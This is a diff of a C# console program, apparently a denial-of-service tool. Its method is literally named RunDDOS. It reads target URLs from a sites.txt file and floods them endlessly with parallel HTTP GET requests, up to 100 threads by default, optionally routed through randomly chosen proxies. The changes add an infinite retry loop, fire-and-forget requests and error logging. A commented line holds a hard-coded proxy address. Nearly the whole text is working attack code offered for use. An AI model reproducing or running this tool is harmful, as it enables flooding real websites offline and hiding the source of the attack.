@@ -1,48 +1,73 @@
 using System;
+using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using System.Net;
 using System.Net.Http;
 using System.Threading.Tasks;
 
-namespace NOWAR
+namespace NOWARASPNET
 {
     internal class Program
     {
         private const int defaultThreads = 100;
-
+        
         static void Main(string[] args)
         {
-            MainAsync().GetAwaiter().GetResult();
+            Logger _logger = new Logger();
+            try
+            {
+                MainAsync(_logger).GetAwaiter().GetResult();
+            }
+            catch (Exception ex)
+            {
+                _logger.LogData(ex.ToString());
+            }
         }
 
 
-        static async Task MainAsync()
+        static async Task MainAsync(Logger logger)
         {
             //Test Connection with Proxy
             /*Request request = new Request("91.202.240.208:51678");
             await request.Get("https://api.ipify.org");*/
-
+            
 
             Console.Write("Enter the number of threads (default 100): ");
             string input = Console.ReadLine();
 
-            int threads = defaultThreads;
-            int.TryParse(input, out threads);
-            if (threads == 0)
+            int _threads = defaultThreads;
+            int.TryParse(input, out _threads);
+            if (_threads == 0)
             {
-                threads = defaultThreads;
+                _threads = defaultThreads;
             }
 
             Console.Write("Do you wan't to use proxy? (1 - yes; 0 - no): ");
             input = Console.ReadLine();
-            int res = 0;
-            int.TryParse(input, out res);
+            int _res = 0;
+            int.TryParse(input, out _res);
 
-            Console.WriteLine($"Number of threads set to: {threads}");
+            Console.WriteLine($"Number of threads set to: {_threads}");
 
+
+            
+            while (true)
+            {
+                try
+                {
+                    await RunDDOS(_res, _threads);
+                }
+                catch (Exception ex)
+                {
+                    logger.LogData(ex.ToString());
+                }
+            }
+        }
+
+        static async Task RunDDOS(int res, int threads)
+        {
             string[] sites = File.ReadAllLines(Environment.CurrentDirectory.ToString() + "\\sites.txt");
-
 
             if (res == 1)
             {
@@ -57,7 +82,7 @@ namespace NOWAR
                     await Task.Run(() => Parallel.ForEach(sites, new ParallelOptions { MaxDegreeOfParallelism = threads }, site =>
                     {
                         request = new Request(proxys[random.Next(0, proxys.Length - 1)]);
-                        _ = request.Get(site);
+                        request.Get(site);
                     }));
                 }
             }
@@ -69,7 +94,7 @@ namespace NOWAR
                 {
                     await Task.Run(() => Parallel.ForEach(sites, new ParallelOptions { MaxDegreeOfParallelism = threads }, site =>
                     {
-                        _ = request.Get(site);
+                        request.Get(site);
                     }));
                 }
             }
@@ -94,7 +119,7 @@ namespace NOWAR
             _httpClient = new HttpClient(_httpClientHandler);
         }
 
-        public async Task Get(string url)
+        public async void Get(string url)
         {
             try
             {
@@ -112,5 +137,30 @@ namespace NOWAR
     }
 
 
+    class Logger
+    {
+
+        public void LogData(string data)
+        {
+            try
+            {
+                string path = Directory.GetCurrentDirectory() + @"\program.log";
+                FileStream fileStream = File.Open(path, File.Exists(path) ? FileMode.Append : FileMode.OpenOrCreate, FileAccess.Write, FileShare.ReadWrite);
+
+                using (StreamWriter fs = new StreamWriter(fileStream))
+                {
+                    fs.WriteLine(data);
+                };
+                fileStream.Close();
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex);
+            }
+        }
+
+    }
 
 }
+
+
